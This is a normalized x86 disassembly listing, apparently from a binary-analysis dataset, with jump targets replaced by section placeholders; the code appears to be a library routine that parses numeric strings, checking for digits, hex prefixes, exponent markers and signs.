cmp [ ebp - 0x6c ] 0x0
jne r-xdata
movzx edx [ ebp - 0x60 ]
movzx eax [ ebx + 0x6 ]
add edx 0x9
cmp eax edx
jg r-xdata
mov ecx [ ebx ]
test ecx ecx
je r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x18 ]
call eax
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
cmp [ ebp - 0x34 ] 0x10
mov esi [ ebp - 0x48 ]
jae r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] 0x1
mov [ ebp - 0x2c ] si
mov edi [ ebp - 0x64 ]
mov [ ebp - 0x4 ] 0x2
mov esi ebx
mov [ ebp - 0x68 ] 0x0
call sub_10013d60
test al al
jne r-xdata
cmp [ ebp - 0x54 ] 0x0
jne r-xdata
mov edi [ ebp - 0x64 ]
mov esi ebx
call sub_10013d60
test al al
jne r-xdata
mov dx [ ebp - 0x60 ]
cmp dx [ ebx + 0x6 ]
ja r-xdata
mov ecx [ ebx ]
test ecx ecx
je r-xdata
mov eax [ ebp - 0x58 ]
mov [ eax ] 0x30
inc eax
inc [ ebp - 0x74 ]
mov [ ebp - 0x58 ] eax
mov dx [ ebp - 0x60 ]
cmp [ ebx + 0x6 ] dx
jne r-xdata
mov ecx [ ebx ]
test ecx ecx
je r-xdata
mov [ ebx ] 0x0
mov [ ebx + 0x4 ] 0x1
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x18 ]
call eax
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov eax [ ebp - 0x58 ]
mov [ eax ] 0x30
inc eax
mov [ ebp - 0x58 ] eax
mov edi [ ebp - 0x6c ]
cmp edi 0x24
jl r-xdata
mov [ ebx ] 0x0
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov [ ebx + 0x6 ] ax
jmp r-xdata
mov eax [ eax ]
movzx eax [ eax ]
jmp r-xdata
cmp [ ebp - 0x54 ] 0x0
mov edi [ ebp - 0x18 ]
jne r-xdata
lea esi [ ebp - 0x48 ]
movzx eax [ ebx + 0x6 ]
cmp [ ebp - 0x60 ] ax
ja r-xdata
mov ecx [ ebx ]
test ecx ecx
je r-xdata
mov edx [ ebp - 0x80 ]
mov [ ebp - 0x58 ] edx
cmp [ ebp - 0x4c ] 0x0
jne r-xdata
cmp [ ebx + 0x4 ] al
jne r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov [ ebx ] 0x0
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov ecx [ ebx ]
dec [ ebp - 0x74 ]
mov [ ebp - 0x4c ] 0x1
test ecx ecx
je r-xdata
mov [ ebx ] 0x0
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ecx ]
mov edx [ eax + 0x1c ]
call edx
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov [ ebx + 0x6 ] ax
jmp r-xdata
mov eax [ eax ]
movzx eax [ eax ]
jmp r-xdata
mov esi ebx
call sub_10013700
cmp ax [ ebp - 0x60 ]
jne r-xdata
inc [ ebp - 0x74 ]
jmp r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x18 ]
call eax
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov [ ebx + 0x4 ] 0x1
movzx eax ax
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ ebp - 0x4 ] 0x1
cmp edi 0x10
jb r-xdata
mov edx [ ebp - 0x68 ]
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
mov esi ebx
call sub_10013700
movzx edx ax
movzx eax [ ebp - 0x60 ]
add eax 0x9
cmp edx eax
jg r-xdata
mov [ ebx ] 0x0
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x74 ]
mov ecx [ ebp - 0x48 ]
push ecx
call sub_100173b1
add esp 0x4
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x58 ]
mov [ eax ] 0x0
jb r-xdata
mov edi [ ebp - 0x7c ]
movzx esi [ ebx + 0x6 ]
push edi
xor eax eax
lea edx [ ebp - 0x78 ]
push edx
mov [ ebp - 0x5c ] eax
mov [ ebp - 0x78 ] eax
push 0x1
lea eax [ ebp - 0x50 ]
push eax
lea ecx [ ebp - 0x5c ]
push ecx
mov [ ebp - 0x50 ] 0x65
call sub_10016639
add esp 0x14
cmp si [ ebp - 0x5c ]
je r-xdata
mov ecx [ ebx ]
test ecx ecx
je r-xdata
movzx edx [ ebp - 0x60 ]
movzx eax [ ebx + 0x6 ]
add edx 0x9
cmp eax edx
jg r-xdata
mov ecx [ ebx ]
test ecx ecx
je r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x18 ]
call eax
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov [ ebx ] 0x0
mov [ ebx + 0x4 ] 0x1
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x18 ]
call eax
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov [ ebx + 0x4 ] 0x0
jmp r-xdata
mov eax edx
dec [ eax ]
mov ecx [ ecx + 0x20 ]
mov eax [ ecx ]
lea edx [ eax + 0x2 ]
mov [ ecx ] edx
movzx eax [ eax ]
jmp r-xdata
mov [ ebx + 0x4 ] 0x1
movzx eax ax
mov ecx 0xffff
cmp cx ax
je r-xdata
mov esi ebx
call sub_10013700
mov dl 0x30
sub dl [ ebp - 0x60 ]
lea ecx [ edx + eax ]
mov eax [ ebp - 0x58 ]
mov [ eax ] cl
inc eax
inc [ ebp - 0x6c ]
mov [ ebp - 0x58 ] eax
test edi edi
je r-xdata
mov ecx [ ebx ]
mov [ ebp - 0x4c ] 0x1
test ecx ecx
je r-xdata
mov [ ebx + 0x6 ] ax
jmp r-xdata
mov eax [ eax ]
movzx eax [ eax ]
jmp r-xdata
mov eax [ ebp - 0x2c ]
push eax
call sub_100173b1
add esp 0x4
mov cl [ esi ]
cmp cl 0x7f
je r-xdata
mov ecx [ ebp - 0x68 ]
cmp [ eax + ecx ] 0x0
je r-xdata
lea eax [ ebp - 0x2c ]
mov edi [ ebp - 0x6c ]
mov [ ebp - 0x4c ] 0x1
cmp edi 0x24
jl r-xdata
mov eax [ ecx ]
mov edx [ eax + 0x18 ]
call edx
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov eax [ ebp - 0x58 ]
mov [ eax ] 0x65
mov ecx [ ebx ]
inc eax
mov [ ebp - 0x58 ] eax
test ecx ecx
je r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov [ ebx ] 0x0
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
cmp [ ebp - 0x5c ] 0x24
jge r-xdata
mov [ ebx ] 0x0
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov [ ebx + 0x6 ] ax
jmp r-xdata
mov eax [ eax ]
movzx eax [ eax ]
jmp r-xdata
mov eax [ ecx ]
mov edx [ eax + 0x1c ]
call edx
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov [ ebx + 0x6 ] ax
jmp r-xdata
mov eax [ eax ]
movzx eax [ eax ]
jmp r-xdata
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ ebx ] 0x0
mov [ ebx + 0x4 ] 0x1
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov [ ebx + 0x4 ] 0x1
movzx eax ax
mov ecx 0xffff
cmp cx ax
je r-xdata
dec edx
je r-xdata
cmp [ ebp - 0x68 ] 0x0
je r-xdata
cmp [ ebp - 0x70 ] 0x0
je r-xdata
mov esi ebx
call sub_10013700
cmp ax [ ebp - 0x60 ]
jne r-xdata
inc [ ebp - 0x74 ]
jmp r-xdata
mov [ ebx + 0x6 ] ax
jmp r-xdata
mov eax [ eax ]
movzx eax [ eax ]
jmp r-xdata
mov [ ebx ] 0x0
mov [ ebx + 0x4 ] 0x1
mov edx [ ecx + 0x20 ]
cmp [ edx ] 0x0
je r-xdata
movzx esi [ ebx + 0x6 ]
push edi
xor eax eax
lea edx [ ebp - 0x78 ]
push edx
mov [ ebp - 0x5c ] eax
mov [ ebp - 0x78 ] eax
push 0x1
lea eax [ ebp - 0x50 ]
push eax
lea ecx [ ebp - 0x5c ]
push ecx
mov [ ebp - 0x50 ] 0x45
call sub_10016639
add esp 0x14
cmp si [ ebp - 0x5c ]
jne r-xdata
mov ecx [ ebx ]
test ecx ecx
je r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x18 ]
call eax
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov ecx [ ebx ]
mov [ ebp - 0x4c ] 0x1
test ecx ecx
je r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x18 ]
call eax
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov [ ebx + 0x4 ] 0x1
movzx eax ax
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ ebx + 0x4 ] 0x0
jmp r-xdata
mov eax edx
dec [ eax ]
mov ecx [ ecx + 0x20 ]
mov eax [ ecx ]
lea edx [ eax + 0x2 ]
mov [ ecx ] edx
movzx eax [ eax ]
jmp r-xdata
mov [ ebx + 0x4 ] 0x1
movzx eax ax
mov ecx 0xffff
cmp cx ax
je r-xdata
jmp r-xdata
mov eax [ ecx ]
mov edx [ eax + 0x1c ]
call edx
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
test edx edx
jne r-xdata
mov eax [ ebp - 0x2c ]
cmp edi 0x10
jae r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
mov esi ebx
call sub_10013700
cmp ax [ ebp - 0x70 ]
jne r-xdata
mov esi ebx
call sub_10013700
mov dl 0x30
sub dl [ ebp - 0x60 ]
lea ecx [ edx + eax ]
mov eax [ ebp - 0x58 ]
mov [ eax ] cl
inc eax
inc [ ebp - 0x6c ]
mov [ ebp - 0x58 ] eax
test edi edi
je r-xdata
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x2c ]
cmp edx 0x10
jae r-xdata
mov [ ebx + 0x4 ] 0x1
movzx eax ax
mov ecx 0xffff
cmp cx ax
je r-xdata
mov edi [ ebp - 0x64 ]
mov esi ebx
call sub_10013d60
test al al
jne r-xdata
cmp [ ebx + 0x4 ] al
jne r-xdata
mov eax [ ecx ]
mov edx [ eax + 0x1c ]
call edx
movzx eax ax
mov eax [ ecx + 0x30 ]
cmp [ eax ] 0x0
jle r-xdata
mov [ ebx ] 0x0
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov [ ebx + 0x6 ] ax
jmp r-xdata
mov eax [ eax ]
movzx eax [ eax ]
jmp r-xdata
mov [ ebx ] 0x0
mov [ ebx + 0x4 ] 0x1
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov dl [ ebx + 0x6 ]
sub dl [ ebp - 0x60 ]
mov eax [ ebp - 0x58 ]
add dl 0x30
mov [ eax ] dl
inc eax
inc [ ebp - 0x5c ]
mov [ ebp - 0x58 ] eax
mov ecx [ ebx ]
test ecx ecx
je r-xdata
mov [ ebx + 0x6 ] ax
jmp r-xdata
mov eax [ eax ]
movzx eax [ eax ]
jmp r-xdata
mov edi [ ebp - 0x64 ]
mov esi ebx
call sub_10013d60
test al al
je r-xdata
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ ebx + 0x4 ] 0x0
jmp r-xdata
mov eax edx
dec [ eax ]
mov ecx [ ecx + 0x20 ]
mov eax [ ecx ]
lea edx [ eax + 0x2 ]
mov [ ecx ] edx
movzx eax [ eax ]
jmp r-xdata
cmp [ esi + 0x1 ] 0x0
jle r-xdata
mov eax [ ebp - 0x2c ]
cmp edi 0x10
jae r-xdata
cmp cl [ eax + edx ]
jne r-xdata
lea eax [ ebp - 0x2c ]
mov edx [ ebp - 0x68 ]
cmp [ eax + edx ] 0x0
jle r-xdata
lea eax [ ebp - 0x2c ]
push 0x0
mov ebx 0x1
lea esi [ ebp - 0x2c ]
call sub_10002a00
add [ ebp - 0x68 ] ebx
mov ebx [ ebp - 0x78 ]
mov ecx [ ebp - 0x68 ]
cmp [ eax + ecx ] 0x7f
je r-xdata
lea eax [ ebp - 0x2c ]
mov edi [ ebp - 0x64 ]
mov esi ebx
call sub_10013d60
test al al
jne r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov edi [ ebp - 0x7c ]
movzx esi [ ebx + 0x6 ]
push edi
xor eax eax
lea edx [ ebp - 0x78 ]
push edx
mov [ ebp - 0x5c ] eax
mov [ ebp - 0x78 ] eax
push 0x1
lea eax [ ebp - 0x50 ]
push eax
lea ecx [ ebp - 0x5c ]
push ecx
mov [ ebp - 0x50 ] 0x2b
call sub_10016639
add esp 0x14
cmp si [ ebp - 0x5c ]
jne r-xdata
mov ecx [ ebx ]
test ecx ecx
je r-xdata
mov [ ebx + 0x4 ] 0x0
jmp r-xdata
dec [ eax ]
mov ecx [ ecx + 0x20 ]
mov eax [ ecx ]
lea edx [ eax + 0x2 ]
mov [ ecx ] edx
movzx eax [ eax ]
jmp r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x18 ]
call eax
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov [ ebx + 0x4 ] 0x1
movzx eax ax
mov ecx 0xffff
cmp cx ax
je r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
jmp r-xdata
mov eax [ ecx ]
mov edx [ eax + 0x1c ]
call edx
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov [ ebx ] 0x0
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov [ ebx + 0x4 ] 0x1
movzx eax ax
mov ecx 0xffff
cmp cx ax
je r-xdata
mov edi [ ebp - 0x64 ]
mov esi ebx
call sub_10013d60
test al al
je r-xdata
mov ecx 0xffff
cmp cx ax
je r-xdata
test edx edx
je r-xdata
inc esi
jmp r-xdata
cmp cl [ eax ]
jl r-xdata
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x54 ] 0x1
mov [ ebp - 0x54 ] 0x1
inc [ ebp - 0x68 ]
jmp r-xdata
mov esi ebx
call sub_10013760
mov edi [ ebp - 0x64 ]
call sub_10013d60
test al al
je r-xdata
mov eax [ ebp - 0x2c ]
cmp edx 0x10
jae r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov dx [ ebp - 0x60 ]
cmp [ ebx + 0x6 ] dx
jne r-xdata
mov ecx [ ebx ]
test ecx ecx
je r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x58 ]
mov [ eax ] 0x2b
mov ecx [ ebx ]
inc eax
mov [ ebp - 0x58 ] eax
test ecx ecx
je r-xdata
mov [ ebx ] 0x0
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov edi [ ebp - 0x64 ]
mov esi ebx
mov [ ebp - 0x4c ] 0x0
mov [ ebp - 0x6c ] 0x0
call sub_10013d60
test al al
jne r-xdata
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ ebx + 0x6 ] ax
jmp r-xdata
mov eax [ eax ]
movzx eax [ eax ]
jmp r-xdata
mov [ ebx + 0x4 ] 0x0
jmp r-xdata
mov eax edx
dec [ eax ]
mov ecx [ ecx + 0x20 ]
mov eax [ ecx ]
lea edx [ eax + 0x2 ]
mov [ ecx ] edx
movzx eax [ eax ]
jmp r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x18 ]
call eax
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
inc [ eax + ecx ]
jmp r-xdata
lea eax [ ebp - 0x2c ]
mov dx [ ebp - 0x60 ]
cmp dx [ ebx + 0x6 ]
ja r-xdata
mov ecx [ ebx ]
test ecx ecx
je r-xdata
cmp [ ebp - 0x4c ] 0x0
je r-xdata
mov ecx [ ebx ]
mov [ ebp - 0x4c ] 0x1
test ecx ecx
je r-xdata
mov [ ebx ] 0x0
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
movzx esi [ ebx + 0x6 ]
push edi
xor eax eax
lea edx [ ebp - 0x78 ]
push edx
mov [ ebp - 0x5c ] eax
mov [ ebp - 0x78 ] eax
push 0x1
lea eax [ ebp - 0x50 ]
push eax
lea ecx [ ebp - 0x5c ]
push ecx
mov [ ebp - 0x50 ] 0x2d
call sub_10016639
add esp 0x14
cmp si [ ebp - 0x5c ]
jne r-xdata
mov ecx [ ebx ]
test ecx ecx
je r-xdata
mov [ ebx + 0x4 ] 0x1
mov [ ebx ] 0x0
mov edx [ ecx + 0x20 ]
cmp [ edx ] 0x0
je r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x18 ]
call eax
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov [ ebx + 0x4 ] 0x1
movzx eax ax
mov ecx 0xffff
cmp cx ax
je r-xdata
mov edi [ ebp - 0x64 ]
mov esi ebx
call sub_10013d60
test al al
je r-xdata
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ ebx + 0x6 ] ax
jmp r-xdata
mov eax [ eax ]
movzx eax [ eax ]
jmp r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov [ ebx ] 0x0
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x58 ]
mov [ eax ] 0x30
inc eax
mov [ ebp - 0x58 ] eax
mov [ ebx ] 0x0
mov [ ebx + 0x4 ] 0x1
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x18 ]
call eax
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov eax [ ebp - 0x58 ]
mov [ eax ] 0x2d
mov ecx [ ebx ]
inc eax
mov [ ebp - 0x58 ] eax
test ecx ecx
je r-xdata
mov [ ebx ] 0x0
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ecx ]
mov edx [ eax + 0x1c ]
call edx
movzx eax ax
mov eax [ ecx + 0x30 ]
cmp [ eax ] 0x0
jle r-xdata
mov [ ebx + 0x6 ] ax
jmp r-xdata
mov eax [ eax ]
movzx eax [ eax ]
jmp r-xdata
mov [ ebx + 0x4 ] 0x1
movzx eax ax
mov ecx 0xffff
cmp cx ax
je r-xdata
movzx edx [ ebp - 0x60 ]
movzx eax [ ebx + 0x6 ]
add edx 0x9
cmp eax edx
jg r-xdata
mov ecx [ ebx ]
test ecx ecx
je r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x18 ]
call eax
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
jmp r-xdata
mov eax [ ecx ]
mov edx [ eax + 0x1c ]
call edx
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov [ ebx + 0x6 ] ax
jmp r-xdata
mov eax [ eax ]
movzx eax [ eax ]
jmp r-xdata
mov edx [ ecx + 0x20 ]
cmp [ edx ] 0x0
je r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x18 ]
call eax
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov [ ebx + 0x4 ] 0x0
jmp r-xdata
dec [ eax ]
mov ecx [ ecx + 0x20 ]
mov eax [ ecx ]
lea edx [ eax + 0x2 ]
mov [ ecx ] edx
movzx eax [ eax ]
jmp r-xdata
mov [ ebx + 0x4 ] 0x1
movzx eax ax
mov ecx 0xffff
cmp cx ax
je r-xdata
cmp [ ebp - 0x6c ] 0x8
jge r-xdata
mov [ ebx ] 0x0
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov [ ebx + 0x6 ] ax
jmp r-xdata
mov eax [ eax ]
movzx eax [ eax ]
jmp r-xdata
mov [ ebx + 0x4 ] 0x0
jmp r-xdata
mov eax edx
dec [ eax ]
mov ecx [ ecx + 0x20 ]
mov eax [ ecx ]
lea edx [ eax + 0x2 ]
mov [ ecx ] edx
movzx eax [ eax ]
jmp r-xdata
mov [ ebx + 0x4 ] 0x1
movzx eax ax
mov ecx 0xffff
cmp cx ax
je r-xdata
mov eax [ ecx + 0x30 ]
cmp [ eax ] 0x0
jle r-xdata
mov [ ebx + 0x6 ] ax
jmp r-xdata
mov eax [ eax ]
movzx eax [ eax ]
jmp r-xdata
mov ecx 0xffff
cmp cx ax
je r-xdata
mov ecx [ ebx ]
mov [ ebp - 0x4c ] 0x1
test ecx ecx
je r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x18 ]
call eax
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov [ ebx + 0x4 ] 0x1
movzx eax ax
mov ecx 0xffff
cmp cx ax
je r-xdata
mov edi [ ebp - 0x64 ]
mov esi ebx
call sub_10013d60
test al al
je r-xdata
mov ecx 0xffff
cmp cx ax
je r-xdata
dec [ eax ]
mov ecx [ ecx + 0x20 ]
mov eax [ ecx ]
lea edx [ eax + 0x2 ]
mov [ ecx ] edx
movzx eax [ eax ]
jmp r-xdata
mov [ ebx + 0x4 ] 0x1
movzx eax ax
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ ebx ] 0x0
mov [ ebx + 0x4 ] 0x1
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov dl [ ebx + 0x6 ]
sub dl [ ebp - 0x60 ]
mov eax [ ebp - 0x58 ]
add dl 0x30
mov [ eax ] dl
inc eax
inc [ ebp - 0x6c ]
mov [ ebp - 0x58 ] eax
mov ecx [ ebx ]
test ecx ecx
je r-xdata
mov [ ebx + 0x6 ] ax
jmp r-xdata
mov eax [ eax ]
movzx eax [ eax ]
jmp r-xdata
mov eax [ ecx ]
mov edx [ eax + 0x1c ]
call edx
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov [ ebx ] 0x0
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov [ ebx + 0x4 ] 0x1
movzx eax ax
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ ebx + 0x4 ] 0x0
jmp r-xdata
mov eax edx
dec [ eax ]
mov ecx [ ecx + 0x20 ]
mov eax [ ecx ]
lea edx [ eax + 0x2 ]
mov [ ecx ] edx
movzx eax [ eax ]
jmp r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x18 ]
call eax
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov edi [ ebp - 0x64 ]
mov esi ebx
call sub_10013d60
test al al
je r-xdata
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ ebx + 0x6 ] ax
jmp r-xdata
mov eax [ eax ]
movzx eax [ eax ]
jmp r-xdata
mov [ ebx + 0x4 ] 0x1
movzx eax ax
mov ecx 0xffff
cmp cx ax
je r-xdata
sub_10012680
push ebp
mov ebp esp
sub esp 0x10
xor eax eax
test ecx ecx
je r-xdata
mov esp ebp
pop ebp
retn
cmp ecx 0x7ffffff
ja r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x0
call sub_10016f5a
push r--data
lea ecx [ ebp - 0x10 ]
push ecx
mov [ ebp - 0x10 ] r--data
call sub_10017df7
shl ecx 0x5
push ecx
call sub_1001740d
add esp 0x4
test eax eax
jne r-xdata
sub_100126d0
push ebp
mov ebp esp
push 0xffffffff
push sub_1002875b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x84
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
mov [ ebp - 0x88 ] ecx
mov ecx [ ebp + 0x14 ]
mov [ ebp - 0x7c ] eax
mov eax [ ebp + 0x10 ]
lea edi [ ebp - 0x90 ]
mov [ ebp - 0x78 ] ebx
mov [ ebp - 0x60 ] edx
mov [ ebp - 0x8c ] ecx
call sub_100034b0
mov edi eax
mov [ ebp - 0x4 ] 0x0
call sub_10007de0
mov [ ebp - 0x6c ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x90 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x6c ]
lea esi [ ebp - 0x48 ]
call sub_10007530
mov [ ebp - 0x4 ] 0x1
mov esi [ ebp - 0x7c ]
add esi 0x8
push esi
lea ecx [ ebp - 0x5c ]
push ecx
push 0x1
lea edx [ ebp - 0x50 ]
push edx
lea eax [ ebp - 0x70 ]
xor edi edi
push eax
mov [ ebp - 0x50 ] 0x30
mov [ ebp - 0x70 ] edi
mov [ ebp - 0x5c ] edi
mov [ ebp - 0x84 ] esi
call sub_10016639
add esp 0x14
push esi
lea ecx [ ebp - 0x5c ]
push ecx
push 0x1
lea edx [ ebp - 0x50 ]
push edx
lea eax [ ebp - 0x7c ]
push eax
mov [ ebp - 0x50 ] 0x61
mov [ ebp - 0x7c ] edi
mov [ ebp - 0x5c ] edi
call sub_10016639
add esp 0x14
push esi
lea ecx [ ebp - 0x5c ]
push ecx
push 0x1
lea edx [ ebp - 0x50 ]
push edx
lea eax [ ebp - 0x80 ]
push eax
mov [ ebp - 0x50 ] 0x41
mov [ ebp - 0x80 ] edi
mov [ ebp - 0x5c ] edi
call sub_10016639
mov ecx [ ebp - 0x88 ]
mov edi [ ebp - 0x60 ]
add esp 0x14
mov esi ebx
mov [ ebp - 0x58 ] ecx
mov [ ebp - 0x50 ] 0x0
call sub_10013d60
test al al
jne r-xdata
push 0x0
lea ecx [ ebp - 0x5c ]
mov edi eax
call sub_100163b9
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x58 ]
mov edi [ ebp - 0x60 ]
mov [ eax ] 0x7830
add eax 0x2
mov [ ebp - 0x58 ] eax
xor eax eax
mov esi ebx
mov [ ebp - 0x4c ] 0x0
mov [ ebp - 0x64 ] eax
mov [ ebp - 0x74 ] eax
call sub_10013d60
test al al
jne r-xdata
cmp [ ebx + 0x4 ] al
jne r-xdata
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
lea ecx [ ebp - 0x5c ]
not esi
call sub_100163e1
and esi edi
je r-xdata
cmp eax 0xffffffff
jae r-xdata
mov ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x48 ]
mov eax edx
cmp ecx 0x10
jae r-xdata
cmp [ ebx + 0x4 ] al
jne r-xdata
mov edi [ ebp - 0x84 ]
movzx esi [ ebx + 0x6 ]
push edi
xor eax eax
lea edx [ ebp - 0x68 ]
push edx
mov [ ebp - 0x5c ] eax
mov [ ebp - 0x68 ] eax
push 0x1
lea eax [ ebp - 0x4c ]
push eax
lea ecx [ ebp - 0x5c ]
push ecx
mov [ ebp - 0x4c ] 0x2b
call sub_10016639
add esp 0x14
cmp si [ ebp - 0x5c ]
jne r-xdata
mov ecx [ ebx ]
test ecx ecx
je r-xdata
mov edx [ esi ]
mov eax [ edx ]
push 0x1
mov ecx esi
call eax
dec eax
mov [ edi + 0x4 ] eax
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x48 ]
movzx eax [ ebx + 0x6 ]
cmp ax [ ebp - 0x70 ]
jne r-xdata
mov ecx [ ebx ]
test ecx ecx
je r-xdata
push edi
xor eax eax
lea edx [ ebp - 0x68 ]
push edx
mov [ ebp - 0x5c ] eax
mov [ ebp - 0x68 ] eax
push 0x1
lea eax [ ebp - 0x4c ]
push eax
lea ecx [ ebp - 0x5c ]
push ecx
mov [ ebp - 0x4c ] 0x2d
call sub_10016639
movzx edi [ ebp - 0x5c ]
add esp 0x14
mov esi ebx
call sub_10013700
cmp ax di
jne r-xdata
mov eax [ ebp - 0x88 ]
mov [ eax ] 0x2b
jmp r-xdata
mov [ ebx ] 0x0
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov edi [ ebp - 0x60 ]
mov esi ebx
call sub_10013d60
test al al
jne r-xdata
mov eax edx
cmp ecx 0x10
jae r-xdata
mov esi ebx
call sub_10013760
mov esi eax
call sub_10013d60
test al al
jne r-xdata
mov [ ebx ] 0x0
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x88 ]
mov [ eax ] 0x2d
inc eax
mov esi ebx
mov [ ebp - 0x58 ] eax
call sub_10013760
mov eax [ ecx ]
mov edx [ eax + 0x18 ]
call edx
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
cmp [ ebp - 0x4c ] 0x0
je r-xdata
cmp [ ebx + 0x4 ] 0x0
